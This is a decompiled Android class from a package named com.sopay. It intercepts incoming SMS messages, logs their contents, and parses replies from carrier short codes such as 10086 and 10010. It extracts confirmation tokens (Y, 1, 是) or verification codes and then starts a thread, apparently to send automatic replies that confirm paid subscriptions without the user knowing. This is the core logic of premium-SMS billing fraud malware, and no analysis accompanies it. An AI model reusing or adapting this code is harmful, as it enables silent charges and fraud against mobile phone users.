package com.sopay;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class j
  extends BroadcastReceiver
{
  public static l a;
  
  public j() {}
  
  private static void a(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {
      return;
    }
    paramString = paramString.replaceAll("\\d{4}年\\d{1,2}月\\d{1,2}日\\s?(\\d{1,2}点\\d{1,2}分)?", "").replaceAll("\\d{4}-\\d{1,2}-\\d{1,2}\\s?(\\d{1,2}:\\d{1,2}(:\\d{1,2})?)?", "").replaceAll("([a-z0-9_]+\\.)*([a-z0-9_]+\\.){2}(com|cn)", "").replaceAll("1[3458]{1}\\d{9}", "").replaceAll("1[3458][0-9\\*]{4}\\d{4}", "").replaceAll("400-([0-9]){1}([0-9-]{7})", "").replaceAll("0\\d{2,3}-\\d{5,9}|0\\d{2,3}-\\d{5,9}", "").replaceAll("(拨打|客服|热线|咨询)(.*)+", "").replaceAll("[0-9]{1,2}(小时|分)", "").replaceAll("[0-9]{1,4}\\.00", "");
    paramString = Pattern.compile("[a-z0-9A-Z]{4,30}").matcher(paramString);
    for (;;)
    {
      if (!paramString.find())
      {
        if (TextUtils.isEmpty(a.d)) {
          break;
        }
        a.b = "3";
        return;
      }
      if (b(paramString.group()))
      {
        if ((paramString.group().startsWith("10086")) || (paramString.group().startsWith("10010")) || (paramString.group().startsWith("10000")))
        {
          a.c = paramString.group();
          continue;
        }
        if (a.c(paramString.group()))
        {
          a.c = paramString.group();
          continue;
        }
      }
      a.d = paramString.group();
    }
  }
  
  private static boolean b(String paramString)
  {
    try
    {
      Integer.parseInt(paramString);
      return true;
    }
    catch (NumberFormatException paramString) {}
    return false;
  }
  
  public final void onReceive(Context paramContext, Intent paramIntent)
  {
    int j = 0;
    int i;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramContext = paramIntent.getExtras();
      if (paramContext != null)
      {
        paramIntent = (Object[])paramContext.get("pdus");
        if ((paramIntent != null) && (paramIntent.length > 0))
        {
          paramContext = new SmsMessage[paramIntent.length];
          i = 0;
        }
      }
    }
    for (;;)
    {
      if (i >= paramIntent.length)
      {
        int k = paramContext.length;
        i = j;
        if (i < k) {
          break;
        }
        return;
      }
      paramContext[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
      i += 1;
    }
    String str = paramContext[i];
    paramIntent = str.getMessageBody();
    str = str.getOriginatingAddress();
    Log.i("SmsBroad", str + "-" + paramIntent);
    l localL = new l();
    a = localL;
    localL.c = str;
    a.b = "1";
    if (a.c(str))
    {
      Log.i("SmsBroad", "msg " + paramIntent);
      if ((!TextUtils.isEmpty(paramIntent)) && (!a.a("(成功购买|成功定制|成功订购|订购成功|开始生效)", paramIntent)))
      {
        if (!a.a("\\b(Y|y|1|是)\\b", paramIntent)) {
          break label403;
        }
        if (!a.a("\\bY\\b", paramIntent)) {
          break label319;
        }
        a.b = "2";
        a.d = "Y";
      }
    }
    for (;;)
    {
      if ((a.b == "2") || (a.b == "3"))
      {
        paramIntent = a.c;
        str = a.d;
        if ((!TextUtils.isEmpty(paramIntent)) && (!TextUtils.isEmpty(str))) {
          new k(paramIntent, str).start();
        }
      }
      i += 1;
      break;
      label319:
      if (a.a("\\b是\\b", paramIntent))
      {
        a.b = "2";
        a.d = "是";
      }
      else if (a.a("\\b1\\b", paramIntent))
      {
        a.b = "2";
        a.d = "1";
      }
      else if (a.a("\\by\\b", paramIntent))
      {
        a.b = "2";
        a.d = "y";
      }
      else
      {
        label403:
        a(paramIntent);
      }
    }
  }
}
